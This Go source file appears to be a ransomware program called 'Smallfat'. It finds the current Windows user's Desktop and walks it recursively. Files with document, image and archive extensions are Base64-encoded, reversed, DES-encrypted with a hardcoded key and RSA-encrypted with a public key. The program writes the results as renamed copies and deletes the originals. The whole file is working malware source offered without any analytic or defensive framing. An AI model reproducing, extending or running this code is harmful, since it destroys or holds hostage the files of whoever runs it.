package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"strings"
)

var (
	WhiteList = map[string]string{ //加密文件白名单
		//document
		"word_before":  ".doc",
		"word_after":   ".docx",
		"excel_before": ".xls",
		"excel_afte":   ".xlsx",
		"powerpoint":   ".pptx",
		"pdf":          ".pdf",
		"wps_on":       ".dot",
		"wps_two":      ".dotx",
		"txt":          ".txt",
		//images
		"images1": ".jpg",
		"images2": ".jpeg",
		"images3": ".png",
		"images4": ".gif",
		"images5": ".bmp",
		"images6": ".tiff",
		"images7": ".ai",
		"images8": ".cdr",
		"images9": ".eps",
		//compression
		"rar": ".rar",
		"7z":  ".7z",
		"zip": ".zip",
	}
	key = []byte("Smallfat") //密钥
)

func Del_File(fileName string) {
	err := os.Remove(fileName)
	if err != nil {
		return
	}
}

func Write_File(fileName string, RSAContent []byte) {
	//写入文件
	content := `https://github.com/RuanLang0777/Smallfat` + "\r\n\r\n" + string(RSAContent)
	baseName := path.Base(fileName)           
	ext := path.Ext(baseName)                 
	name := strings.TrimSuffix(baseName, ext)
	err := ioutil.WriteFile(name+"_Smallfat"+ext, []byte(content), 0777)
	Del_File(fileName)
	if err != nil {
		return
	}
}

func Base64(fileName string) []byte {
	//Base64编码->反转->Base64编码
	file_byte, _ := ioutil.ReadFile(fileName)
	encryption := base64.StdEncoding.EncodeToString(file_byte)
	reverses := Reverse(encryption)
	reverses_encryption := base64.StdEncoding.EncodeToString([]byte(reverses))
	return []byte(reverses_encryption)

}

func MyDESEncrypt(origData, key []byte) []byte {
	//DES加密
	block, _ := des.NewCipher(key)
	origData = PKCS5Padding(origData, block.BlockSize())
	blockMode := cipher.NewCBCEncrypter(block, key)
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted

}

func MyRSAEncrypt(src, publicKeyByte []byte) (bytesEncrypt []byte) {
	//RSA加密
	block, _ := pem.Decode(publicKeyByte)
	publicKey, _ := x509.ParsePKIXPublicKey(block.Bytes)
	keySize, srcSize := publicKey.(*rsa.PublicKey).Size(), len(src)
	pub := publicKey.(*rsa.PublicKey)
	offSet, once := 0, keySize-11
	buffer := bytes.Buffer{}
	for offSet < srcSize {
		endIndex := offSet + once
		if endIndex > srcSize {
			endIndex = srcSize
		}
		bytesOnce, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, src[offSet:endIndex])
		buffer.Write(bytesOnce)
		offSet = endIndex
	}
	bytesEncrypt = buffer.Bytes()
	return
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func Read_PublicKey(path string) []byte {
	//读取公钥
	file, _ := os.Open(path)
	defer file.Close()
	info, _ := file.Stat()
	buf := make([]byte, info.Size())
	file.Read(buf)
	return buf
}

func Reverse(enbase64 string) string {
	//反转
	a := []rune(enbase64)
	for i, j := 0, len(a)-1; i < j; i, j = i+1, j-1 {
		a[i], a[j] = a[j], a[i]
	}
	return string(a)
}
func Get_User() []string {
	//获取用户名
	cmd := exec.Command("whoami")
	out, _ := cmd.CombinedOutput()
	whoami := strings.Split(string(out), "\\")
	return whoami
}

func WalkDir(filepath string) ([]string, error) {
	//递归遍历文件
	files, _ := ioutil.ReadDir(filepath)
	var allfile []string               
	for _, v := range files {
		fullPath := filepath + "\\" + v.Name() 
		if v.IsDir() {                         
			a, _ := WalkDir(fullPath)
			allfile = append(allfile, a...)
		} else {
			allfile = append(allfile, fullPath) 
		}
	}

	return allfile, nil
}

func Smallfat() {
	Users := Get_User()
	buf := Read_PublicKey("public.pem")
	paths := `C:\Users\` + Users[1] + `\Desktop`
	desktop := strings.Replace(paths, "\r\n", "", 1)
	files, _ := WalkDir(desktop)
	for _, fileName := range files {
		SuffixName := path.Ext(fileName)
		for _, SuffixVule := range WhiteList {
			if SuffixName == SuffixVule {
				Base64Content := Base64(fileName)
				DESContent := MyDESEncrypt(Base64Content, key)
				RSAContent := MyRSAEncrypt(DESContent,buf)
				Write_File(fileName, RSAContent)
			}
		}
	}
}

func main() {
	Smallfat()
}
